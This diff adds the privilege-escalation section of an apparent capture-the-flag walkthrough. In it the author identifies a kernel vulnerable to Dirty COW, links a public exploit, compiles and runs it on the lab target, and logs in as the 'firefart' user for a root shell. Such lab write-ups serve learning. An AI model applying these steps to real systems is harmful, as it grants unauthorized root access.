@@ -226,7 +226,51 @@ command:```cat /etc/issue```
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/edec7b73-6e7d-47e4-a715-2159d71063b6)
 
+That version of Linux is vulnerable to what is called ```Dirty Cow```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/266466d4-99da-4070-a284-8c636bb5a09b)
+
+<font color="green">The Dirty COW exploit is a security vulnerability in the Linux kernel that allows an attacker to gain write access to read-only memory pages, potentially escalating their privileges on the system. It was patched after its discovery in 2016.</font>
+
 Lets go ahead and look for available exploits
+
+You can get the exploit [here](https://github.com/caldonovan/Dirty-COW-Exploit)
+
+Sending the file over to the target machine
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e39e651d-b8ed-4196-ac65-3e91fb90155d)
+
+Now, lets compile this exploit
+
+command:```gcc -pthread dirty_cow.c -o bankai -lcrypt```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8070ee6b-cd33-4b84-8165-0772cc738ca1)
+
+oops, we get an error when we try to compile the exploit. 
+
+We can use this command to fix the error
+
+command:```PATH=PATH$:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/gcc/x86_64-linux-gnu/4.8/;export PATH```
+
+After running the above command, run ths command again
+
+commands:
+```
+gcc -pthread dirty_cow.c -o bankai -lcrypt
+./bankai
+```
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/948eab13-2169-4d25-912a-13a95999d2fb)
+
+We were asked to provide a new password, well I used ```1234567890```. So we can log in with the username ```firefart``` and the password ```1234567890``` 
+
+command:```ssh firefart@192.168.170.87```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/540bb48b-58ba-4101-bec8-920de0409835)
+
+We got our root shell😎
+
+That will be all for today.
+
 
 
 
